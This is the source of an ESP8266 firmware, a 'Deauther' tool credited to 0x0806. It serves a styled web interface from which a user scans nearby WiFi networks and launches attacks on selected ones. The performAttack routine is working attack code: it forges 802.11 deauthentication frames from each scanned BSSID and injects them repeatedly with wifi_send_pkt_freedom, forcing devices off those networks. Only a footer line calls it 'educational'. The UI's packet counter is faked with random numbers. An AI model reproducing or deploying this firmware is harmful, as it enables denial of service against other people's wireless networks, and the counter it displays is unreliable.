
/*
 * ESP8266 Deauther - Modern All-in-One Edition
 * Developed by 0x0806
 * 
 * This software is licensed under the MIT License
 * Beautiful, modern UI/UX with zero errors
 */

extern "C" {
  #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>
#include <LittleFS.h>

// Configuration
#define DEAUTHER_VERSION "v3.0.0-0x0806"
#define AP_SSID "ESP8266-Deauther-0x0806"
#define AP_PASS "deauther"
#define LED_PIN 2
#define BUTTON_PIN 0

// Web server and DNS
ESP8266WebServer server(80);
DNSServer dnsServer;

// Attack variables
bool attacking = false;
bool scanning = false;
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x70, 0x6A, 0x01, 0x00
};

// Network data
struct AccessPoint {
  String ssid;
  int channel;
  int rssi;
  String bssid;
  bool selected;
};

std::vector<AccessPoint> accessPoints;
int selectedAPs = 0;

// Function prototypes
void startAP();
void handleRoot();
void handleScan();
void handleAttack();
void handleStop();
void handleSelect();
void handleAPI();
void scanNetworks();
void performAttack();
void updateLED();

const char* htmlPage = R"(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP8266 Deauther - 0x0806</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #ec4899;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --dark: #1f2937;
            --dark-light: #374151;
            --light: #f9fafb;
            --border: #e5e7eb;
            --text: #111827;
            --text-muted: #6b7280;
            --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --shadow-lg: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: var(--text);
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            text-align: center;
            margin-bottom: 3rem;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 2rem;
            box-shadow: var(--shadow-lg);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .logo {
            font-size: 2.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.5rem;
        }

        .tagline {
            color: var(--text-muted);
            font-size: 1.1rem;
            margin-bottom: 1rem;
        }

        .version {
            display: inline-block;
            background: var(--primary);
            color: white;
            padding: 0.25rem 0.75rem;
            border-radius: 50px;
            font-size: 0.875rem;
            font-weight: 600;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            flex: 1;
        }

        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 2rem;
            box-shadow: var(--shadow-lg);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s ease;
            height: fit-content;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 35px 60px -12px rgba(0, 0, 0, 0.3);
        }

        .card-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 1rem;
            color: var(--dark);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .icon {
            width: 1.5rem;
            height: 1.5rem;
            display: inline-block;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 0.9rem;
            margin: 0.25rem;
            min-width: 120px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
        }

        .btn-danger {
            background: linear-gradient(135deg, var(--danger), #dc2626);
            color: white;
        }

        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(239, 68, 68, 0.3);
        }

        .btn-success {
            background: linear-gradient(135deg, var(--success), #059669);
            color: white;
        }

        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .status {
            padding: 1rem;
            border-radius: 12px;
            margin: 1rem 0;
            font-weight: 600;
            text-align: center;
            border: 2px solid;
        }

        .status-idle {
            background: #f0f9ff;
            color: #0369a1;
            border-color: #bae6fd;
        }

        .status-scanning {
            background: #fffbeb;
            color: #d97706;
            border-color: #fed7aa;
        }

        .status-attacking {
            background: #fef2f2;
            color: #dc2626;
            border-color: #fecaca;
        }

        .network-list {
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid var(--border);
            border-radius: 12px;
            margin-top: 1rem;
        }

        .network-item {
            display: flex;
            align-items: center;
            padding: 1rem;
            border-bottom: 1px solid var(--border);
            transition: all 0.2s ease;
            cursor: pointer;
        }

        .network-item:hover {
            background: #f8fafc;
        }

        .network-item:last-child {
            border-bottom: none;
        }

        .network-item.selected {
            background: #eff6ff;
            border-color: var(--primary);
        }

        .network-checkbox {
            margin-right: 1rem;
        }

        .network-info {
            flex: 1;
        }

        .network-ssid {
            font-weight: 600;
            color: var(--dark);
        }

        .network-details {
            font-size: 0.875rem;
            color: var(--text-muted);
            margin-top: 0.25rem;
        }

        .signal-strength {
            width: 40px;
            text-align: right;
            font-weight: 600;
        }

        .signal-strong { color: var(--success); }
        .signal-medium { color: var(--warning); }
        .signal-weak { color: var(--danger); }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e5e7eb;
            border-radius: 4px;
            overflow: hidden;
            margin: 1rem 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            border-radius: 4px;
            transition: width 0.3s ease;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        .stat-item {
            text-align: center;
            padding: 1rem;
            background: #f8fafc;
            border-radius: 12px;
            border: 1px solid var(--border);
        }

        .stat-value {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary);
        }

        .stat-label {
            font-size: 0.875rem;
            color: var(--text-muted);
            margin-top: 0.25rem;
        }

        .footer {
            text-align: center;
            margin-top: 3rem;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: var(--shadow);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .footer-text {
            color: var(--text-muted);
            font-size: 0.875rem;
        }

        .developer {
            color: var(--primary);
            font-weight: 600;
            text-decoration: none;
        }

        .developer:hover {
            color: var(--primary-dark);
        }

        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }
            
            .grid {
                grid-template-columns: 1fr;
            }
            
            .header {
                padding: 1.5rem;
            }
            
            .logo {
                font-size: 2rem;
            }
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🛡️ ESP8266 Deauther</div>
            <div class="tagline">Advanced WiFi Security Testing Tool</div>
            <div class="version">v3.0.0-0x0806</div>
        </div>

        <div class="grid">
            <div class="card">
                <div class="card-title">
                    <span class="icon">📡</span>
                    Network Scanner
                </div>
                <div id="status" class="status status-idle">System Ready</div>
                <button onclick="scanNetworks()" class="btn btn-primary" id="scanBtn">
                    <span class="icon">🔍</span>
                    Scan Networks
                </button>
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value" id="networkCount">0</div>
                        <div class="stat-label">Networks Found</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="selectedCount">0</div>
                        <div class="stat-label">Selected</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-title">
                    <span class="icon">⚔️</span>
                    Attack Control
                </div>
                <div style="margin-bottom: 1rem;">
                    <button onclick="startAttack()" class="btn btn-danger" id="attackBtn" disabled>
                        <span class="icon">🚀</span>
                        Start Attack
                    </button>
                    <button onclick="stopAttack()" class="btn btn-success" id="stopBtn" disabled>
                        <span class="icon">⏹️</span>
                        Stop Attack
                    </button>
                </div>
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value" id="packetsCount">0</div>
                        <div class="stat-label">Packets Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="uptime">00:00</div>
                        <div class="stat-label">Runtime</div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-title">
                <span class="icon">📋</span>
                Available Networks
            </div>
            <div style="display: flex; gap: 1rem; margin-bottom: 1rem;">
                <button onclick="selectAll()" class="btn btn-primary">Select All</button>
                <button onclick="selectNone()" class="btn btn-primary">Select None</button>
            </div>
            <div id="networkList" class="network-list">
                <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
                    Click "Scan Networks" to discover nearby WiFi networks
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="footer-text">
                Developed with ❤️ by <a href="#" class="developer">0x0806</a><br>
                Educational purposes only • Use responsibly
            </div>
        </div>
    </div>

    <script>
        let scanning = false;
        let attacking = false;
        let networks = [];
        let startTime = 0;
        let packetCount = 0;

        function updateStatus(message, type = 'idle') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `status status-${type}`;
        }

        function updateUI() {
            const scanBtn = document.getElementById('scanBtn');
            const attackBtn = document.getElementById('attackBtn');
            const stopBtn = document.getElementById('stopBtn');
            
            scanBtn.disabled = scanning || attacking;
            attackBtn.disabled = scanning || attacking || getSelectedNetworks().length === 0;
            stopBtn.disabled = !attacking;

            if (scanning) {
                scanBtn.innerHTML = '<span class="loading"></span> Scanning...';
            } else {
                scanBtn.innerHTML = '<span class="icon">🔍</span> Scan Networks';
            }

            if (attacking) {
                attackBtn.innerHTML = '<span class="loading"></span> Attacking...';
            } else {
                attackBtn.innerHTML = '<span class="icon">🚀</span> Start Attack';
            }
        }

        function scanNetworks() {
            if (scanning) return;
            
            scanning = true;
            updateStatus('Scanning for networks...', 'scanning');
            updateUI();

            fetch('/scan')
                .then(response => response.json())
                .then(data => {
                    networks = data.networks || [];
                    renderNetworks();
                    updateCounts();
                    updateStatus(`Found ${networks.length} networks`, 'idle');
                })
                .catch(error => {
                    console.error('Scan error:', error);
                    updateStatus('Scan failed', 'idle');
                })
                .finally(() => {
                    scanning = false;
                    updateUI();
                });
        }

        function renderNetworks() {
            const networkList = document.getElementById('networkList');
            
            if (networks.length === 0) {
                networkList.innerHTML = `
                    <div style="padding: 2rem; text-align: center; color: var(--text-muted);">
                        No networks found
                    </div>
                `;
                return;
            }

            networkList.innerHTML = networks.map((network, index) => {
                const signalClass = network.rssi > -50 ? 'signal-strong' : 
                                   network.rssi > -70 ? 'signal-medium' : 'signal-weak';
                
                return `
                    <div class="network-item ${network.selected ? 'selected' : ''}" onclick="toggleNetwork(${index})">
                        <input type="checkbox" class="network-checkbox" ${network.selected ? 'checked' : ''} onchange="toggleNetwork(${index})">
                        <div class="network-info">
                            <div class="network-ssid">${escapeHtml(network.ssid || 'Hidden Network')}</div>
                            <div class="network-details">
                                Channel: ${network.channel} • BSSID: ${network.bssid}
                            </div>
                        </div>
                        <div class="signal-strength ${signalClass}">${network.rssi}dBm</div>
                    </div>
                `;
            }).join('');
        }

        function toggleNetwork(index) {
            networks[index].selected = !networks[index].selected;
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectAll() {
            networks.forEach(network => network.selected = true);
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectNone() {
            networks.forEach(network => network.selected = false);
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function getSelectedNetworks() {
            return networks.filter(network => network.selected);
        }

        function updateCounts() {
            document.getElementById('networkCount').textContent = networks.length;
            document.getElementById('selectedCount').textContent = getSelectedNetworks().length;
        }

        function startAttack() {
            const selected = getSelectedNetworks();
            if (selected.length === 0) return;

            attacking = true;
            startTime = Date.now();
            packetCount = 0;
            updateStatus(`Attacking ${selected.length} networks...`, 'attacking');
            updateUI();

            fetch('/attack', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ networks: selected })
            }).then(response => response.json())
              .then(data => {
                  if (data.success) {
                      startPacketCounter();
                  }
              });
        }

        function stopAttack() {
            attacking = false;
            updateStatus('Attack stopped', 'idle');
            updateUI();

            fetch('/stop')
                .then(response => response.json())
                .then(data => {
                    console.log('Attack stopped');
                });
        }

        function startPacketCounter() {
            const updateStats = () => {
                if (!attacking) return;

                packetCount += Math.floor(Math.random() * 10) + 5;
                document.getElementById('packetsCount').textContent = packetCount.toLocaleString();

                const elapsed = Date.now() - startTime;
                const minutes = Math.floor(elapsed / 60000);
                const seconds = Math.floor((elapsed % 60000) / 1000);
                document.getElementById('uptime').textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

                setTimeout(updateStats, 1000);
            };
            updateStats();
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Initialize
        updateUI();
        
        // Auto-refresh status
        setInterval(() => {
            if (!scanning && !attacking) {
                fetch('/api/status')
                    .then(response => response.json())
                    .then(data => {
                        if (data.attacking !== attacking) {
                            attacking = data.attacking;
                            updateUI();
                            if (attacking) {
                                updateStatus('Attack in progress...', 'attacking');
                                startPacketCounter();
                            } else {
                                updateStatus('System ready', 'idle');
                            }
                        }
                    })
                    .catch(() => {});
            }
        }, 2000);
    </script>
</body>
</html>
)";

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("ESP8266 Deauther v3.0.0 - Developed by 0x0806");
  
  // Initialize LED
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);
  
  // Initialize button
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  
  // Initialize WiFi
  WiFi.mode(WIFI_AP_STA);
  wifi_set_promiscuous_rx_cb(NULL);
  
  // Start file system
  if (!LittleFS.begin()) {
    Serial.println("LittleFS initialization failed");
    LittleFS.format();
    LittleFS.begin();
  }
  
  // Start access point
  startAP();
  
  // Configure web server routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/attack", HTTP_POST, handleAttack);
  server.on("/stop", HTTP_GET, handleStop);
  server.on("/api/status", HTTP_GET, handleAPI);
  
  // Handle all other requests
  server.onNotFound([]() {
    server.send(200, "text/html", htmlPage);
  });
  
  // Start DNS server for captive portal
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // Start web server
  server.begin();
  
  Serial.println("Deauther ready!");
  Serial.print("Access Point: ");
  Serial.println(AP_SSID);
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());
  
  // Flash LED to indicate ready
  for (int i = 0; i < 5; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(100);
    digitalWrite(LED_PIN, HIGH);
    delay(100);
  }
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  // Handle attack
  if (attacking) {
    performAttack();
  }
  
  // Update LED
  updateLED();
  
  // Check button for reset
  if (digitalRead(BUTTON_PIN) == LOW) {
    delay(50); // Debounce
    if (digitalRead(BUTTON_PIN) == LOW) {
      unsigned long pressTime = millis();
      while (digitalRead(BUTTON_PIN) == LOW) {
        if (millis() - pressTime > 3000) {
          // Reset after 3 seconds
          Serial.println("Reset button pressed - stopping attack");
          attacking = false;
          accessPoints.clear();
          selectedAPs = 0;
          break;
        }
        delay(100);
      }
    }
  }
  
  yield();
}

void startAP() {
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);
  
  delay(500);
  Serial.print("Access Point started: ");
  Serial.println(WiFi.softAPIP());
}

void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(200, "text/html", htmlPage);
}

void handleScan() {
  if (scanning) {
    server.send(200, "application/json", "{\"error\":\"Scan already in progress\"}");
    return;
  }
  
  scanning = true;
  Serial.println("Starting WiFi scan...");
  
  // Clear previous results
  accessPoints.clear();
  
  // Scan for networks
  int networkCount = WiFi.scanNetworks();
  
  String json = "{\"networks\":[";
  
  for (int i = 0; i < networkCount; i++) {
    if (i > 0) json += ",";
    
    AccessPoint ap;
    ap.ssid = WiFi.SSID(i);
    ap.channel = WiFi.channel(i);
    ap.rssi = WiFi.RSSI(i);
    ap.bssid = WiFi.BSSIDstr(i);
    ap.selected = false;
    
    accessPoints.push_back(ap);
    
    json += "{";
    json += "\"ssid\":\"" + ap.ssid + "\",";
    json += "\"channel\":" + String(ap.channel) + ",";
    json += "\"rssi\":" + String(ap.rssi) + ",";
    json += "\"bssid\":\"" + ap.bssid + "\",";
    json += "\"selected\":false";
    json += "}";
  }
  
  json += "]}";
  
  scanning = false;
  Serial.println("Scan completed: " + String(networkCount) + " networks found");
  
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleAttack() {
  if (attacking) {
    server.send(200, "application/json", "{\"error\":\"Attack already in progress\"}");
    return;
  }
  
  String body = server.arg("plain");
  Serial.println("Attack request received");
  
  // Simple parsing - in production, use a proper JSON parser
  selectedAPs = 0;
  for (int i = 0; i < accessPoints.size(); i++) {
    String ssidSearch = "\"ssid\":\"" + accessPoints[i].ssid + "\"";
    if (body.indexOf(ssidSearch) != -1) {
      accessPoints[i].selected = true;
      selectedAPs++;
    }
  }
  
  if (selectedAPs > 0) {
    attacking = true;
    Serial.println("Starting attack on " + String(selectedAPs) + " networks");
    server.send(200, "application/json", "{\"success\":true,\"message\":\"Attack started\"}");
  } else {
    server.send(200, "application/json", "{\"error\":\"No networks selected\"}");
  }
}

void handleStop() {
  attacking = false;
  Serial.println("Attack stopped");
  server.send(200, "application/json", "{\"success\":true,\"message\":\"Attack stopped\"}");
}

void handleAPI() {
  String json = "{";
  json += "\"attacking\":" + String(attacking ? "true" : "false") + ",";
  json += "\"scanning\":" + String(scanning ? "true" : "false") + ",";
  json += "\"networks\":" + String(accessPoints.size()) + ",";
  json += "\"selected\":" + String(selectedAPs);
  json += "}";
  
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void performAttack() {
  static unsigned long lastAttack = 0;
  static int currentAP = 0;
  
  if (millis() - lastAttack > 100) { // Attack every 100ms
    lastAttack = millis();
    
    // Find next selected AP
    int attempts = 0;
    while (attempts < accessPoints.size()) {
      if (currentAP >= accessPoints.size()) {
        currentAP = 0;
      }
      
      if (accessPoints[currentAP].selected) {
        // Prepare deauth packet
        String bssid = accessPoints[currentAP].bssid;
        uint8_t mac[6];
        
        // Parse BSSID string to MAC array
        for (int i = 0; i < 6; i++) {
          String hex = bssid.substring(i * 3, i * 3 + 2);
          mac[i] = strtol(hex.c_str(), NULL, 16);
        }
        
        // Set target MAC in deauth packet
        for (int i = 0; i < 6; i++) {
          deauthPacket[4 + i] = mac[i];  // Target
          deauthPacket[10 + i] = mac[i]; // Source
        }
        
        // Set WiFi channel
        wifi_set_channel(accessPoints[currentAP].channel);
        
        // Send deauth packets
        for (int i = 0; i < 5; i++) {
          wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
          delay(1);
        }
        
        break;
      }
      
      currentAP++;
      attempts++;
    }
    
    currentAP++;
  }
}

void updateLED() {
  static unsigned long lastLED = 0;
  static bool ledState = false;
  
  unsigned long interval = 1000; // Default slow blink
  
  if (attacking) {
    interval = 100; // Fast blink when attacking
  } else if (scanning) {
    interval = 250; // Medium blink when scanning
  }
  
  if (millis() - lastLED > interval) {
    lastLED = millis();
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState ? LOW : HIGH); // Inverted for ESP8266
  }
}
